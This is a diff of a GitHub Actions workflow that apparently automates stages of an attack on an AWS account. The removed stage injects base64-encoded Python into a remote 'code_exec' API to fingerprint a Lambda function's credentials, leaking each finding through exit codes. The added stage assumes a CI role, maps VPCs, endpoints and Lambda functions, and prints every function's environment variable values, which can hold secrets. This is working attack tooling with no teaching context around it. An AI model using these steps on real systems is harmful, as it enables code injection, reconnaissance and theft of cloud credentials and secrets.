@@ -1,4 +1,4 @@
-name: Stage2-03-Lambda-Credential-Fingerprint
+name: Stage2-04-Map-VPC-And-Lambda
 
 on:
   push:
@@ -7,132 +7,47 @@ on:
 
 permissions:
   contents: read
+  id-token: write
 
 jobs:
-  fingerprint:
+  map:
     runs-on: ubuntu-latest
 
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
-      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
-
     steps:
-      - name: Install dependencies
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Identify current account
         run: |
-          python3 -m pip install requests requests-aws4auth --quiet
+          aws sts get-caller-identity
 
-      - name: Fingerprint Lambda credentials
+      - name: List VPCs
         run: |
-          python3 - <<'PY'
-          import os
-          import base64
-          import requests
-          from requests_aws4auth import AWS4Auth
+          aws ec2 describe-vpcs \
+            --query 'Vpcs[].{VpcId:VpcId,Cidr:CidrBlock,Tags:Tags}' \
+            --output json
 
-          auth = AWS4Auth(
-              os.environ["AWS_ACCESS_KEY_ID"],
-              os.environ["AWS_SECRET_ACCESS_KEY"],
-              "us-east-1",
-              "execute-api",
-              session_token=os.environ["AWS_SESSION_TOKEN"]
-          )
+      - name: List VPC endpoints
+        run: |
+          aws ec2 describe-vpc-endpoints \
+            --query 'VpcEndpoints[].{Id:VpcEndpointId,Vpc:VpcId,Service:ServiceName,State:State,Type:VpcEndpointType}' \
+            --output json
 
-          tests = {
-              "credential_provider": r'''
-          import boto3
+      - name: List Lambda functions
+        run: |
+          aws lambda list-functions \
+            --query 'Functions[].{Name:FunctionName,Role:Role,Runtime:Runtime}' \
+            --output json
 
-          try:
-              session = boto3.Session()
-              credentials = session.get_credentials()
-
-              if credentials is None:
-                  raise SystemExit(9)
-
-              method = str(getattr(credentials, "method", "")).lower()
-
-              if "env" in method:
-                  raise SystemExit(7)
-
-              if "container" in method or "role" in method:
-                  raise SystemExit(8)
-
-              if "assume" in method:
-                  raise SystemExit(10)
-
-              raise SystemExit(11)
-
-          except SystemExit:
-              raise
-          except Exception:
-              raise SystemExit(19)
-          ''',
-
-              "access_key_type": r'''
-          import boto3
-
-          try:
-              credentials = boto3.Session().get_credentials()
-
-              if credentials is None:
-                  raise SystemExit(9)
-
-              key = credentials.access_key or ""
-
-              if key.startswith("ASIA"):
-                  raise SystemExit(7)
-
-              if key.startswith("AKIA"):
-                  raise SystemExit(8)
-
-              raise SystemExit(10)
-
-          except SystemExit:
-              raise
-          except Exception:
-              raise SystemExit(19)
-          ''',
-
-              "lambda_environment": r'''
-          import os
-
-          required = [
-              "AWS_LAMBDA_FUNCTION_NAME",
-              "AWS_LAMBDA_FUNCTION_VERSION",
-              "AWS_EXECUTION_ENV",
-              "AWS_REGION",
-              "AWS_ACCESS_KEY_ID",
-              "AWS_SECRET_ACCESS_KEY",
-              "AWS_SESSION_TOKEN"
-          ]
-
-          present = sum(1 for name in required if os.environ.get(name))
-
-          raise SystemExit(20 + min(present, 20))
-          ''',
-
-              "runtime_api": r'''
-          import os
-
-          if os.environ.get("AWS_LAMBDA_RUNTIME_API"):
-              raise SystemExit(7)
-
-          raise SystemExit(9)
-          '''
-          }
-
-          for name, code in tests.items():
-              encoded = base64.b64encode(code.encode()).decode()
-
-              response = requests.post(
-                  os.environ["API_URL"],
-                  json={"code": encoded},
-                  auth=auth,
-                  timeout=40
-              )
-
-              print(f"TEST={name}")
-              print(response.text)
-              print("---")
-          PY
+      - name: Inspect Lambda configurations
+        run: |
+          for function in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
+            echo "===== FUNCTION: $function ====="
+            aws lambda get-function-configuration \
+              --function-name "$function" \
+              --query '{Name:FunctionName,Role:Role,Vpc:VpcConfig,EnvironmentKeys:Environment.Variables}' \
+              --output json
+          done
